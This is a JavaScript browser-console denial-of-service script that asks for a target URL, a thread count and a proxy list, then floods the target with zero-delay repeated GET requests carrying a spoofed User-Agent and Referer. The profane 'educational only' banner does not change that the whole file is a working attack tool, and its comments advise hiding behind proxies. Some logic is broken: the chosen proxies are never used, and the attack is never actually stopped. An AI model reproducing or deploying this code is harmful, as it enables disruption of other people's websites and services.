// *********************************************************************************************************
 // * WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. MISUSE CAN RESULT IN SEVERE LEGAL PENALTIES. *
 // * THE CREATOR (Bigmancozmo) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS SOFTWARE. USE AT YOUR OWN RISK, ASSHOLE.*
 // * SERIOUSLY, DON'T BE A FUCKING MORON. THIS IS POWERFUL SHIT. *
 // *********************************************************************************************************
 

 // DARK GREEN: #008000
 // PURPLE: #800080
 // DARK RED: #8B0000
 // DARK BLUE: #00008B
 

 const targetURL = prompt("%cEnter target URL (e.g., https://example.com or .onion address):", "https://example.com", "color: #008000");
 const threads = parseInt(prompt("%cEnter number of threads (more = faster takedown, but you'll get caught faster, dumbass):", "500", "color: #008000"));
 const duration = parseInt(prompt("%cEnter attack duration in seconds:", "60", "color: #008000"));
 const proxyListURL = prompt("%cEnter URL to proxy list (HTTP/S only, one proxy per line):", "https://example.com/proxies.txt", "color: #008000");
 

 console.log("%c[INFO] Target: " + targetURL, "color: #008000");
 console.log("%c[INFO] Threads: " + threads, "color: #008000");
 console.log("%c[INFO] Duration: " + duration + " seconds", "color: #008000");
 console.log("%c[WARNING] YOU ARE A FUCKING IDIOT IF YOU USE THIS WITHOUT PROXIES. SERIOUSLY.", "color: #8B0000");
 console.log("%c[WARNING] Misuse is illegal and will get you fucked. Don't be a dumbass.", "color: #8B0000");
 

 const log = (message) => {
  const timestamp = new Date().toISOString();
  console.log(`%c[LOG] ${timestamp}: ${message}`, "color: #800080");
 };
 

 let proxies = [];
 

 const loadProxies = async () => {
  try {
   log("Loading proxies...");
   const response = await fetch(proxyListURL);
   const proxyData = await response.text();
   proxies = proxyData.split('\n').map(p => p.trim()).filter(p => p !== '');
   log(`Loaded ${proxies.length} proxies.`);
  } catch (error) {
   log(`Error loading proxies: ${error}`);
   console.error("%cFAILED TO LOAD PROXIES. YOU'RE FUCKED IF YOU CONTINUE.", "color: #8B0000");
  }
 };
 

 const getRandomProxy = () => {
  if (proxies.length === 0) {
   return null;
  }
  return proxies[Math.floor(Math.random() * proxies.length)];
 };
 

 const attack = async () => {
  try {
   const proxy = getRandomProxy();
   let requestURL = targetURL;
   const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Referer': 'https://www.google.com/'
   };
 

   const controller = new AbortController();
   const timeoutId = setTimeout(() => {
    controller.abort();
    log(`Request timed out.`);
   }, 15000);
 

   let proxyURL = requestURL;
 

   if (proxy) {
    log(`Using proxy: ${proxy}`);
    proxyURL = `https://corsproxy.io/?${encodeURIComponent(requestURL)}`
   }
 

   log("Sending request...");
   const response = await fetch(proxyURL, {
    method: 'GET', // Or POST, depending on target
    mode: 'cors',
    headers: headers,
    signal: controller.signal
   });
   clearTimeout(timeoutId);
   log(`Request sent. Status: ${response ? response.status : 'Unknown (CORS blocked)'}`);
  } catch (error) {
   log(`Error: ${error}`);
  }
 };
 

 log("Starting attack...");
 const startTime = Date.now();
 

 const runAttackThreads = async () => {
  await loadProxies(); // Load proxies before starting attack
  for (let i = 0; i < threads; i++) {
   setInterval(attack, 0); // Fire and forget, max speed
  }
 };
 

 runAttackThreads();
 

 setTimeout(() => {
  log("Attack finished.");
  console.log("%c[INFO] Attack completed.", "color: #008000");
 }, duration * 1000);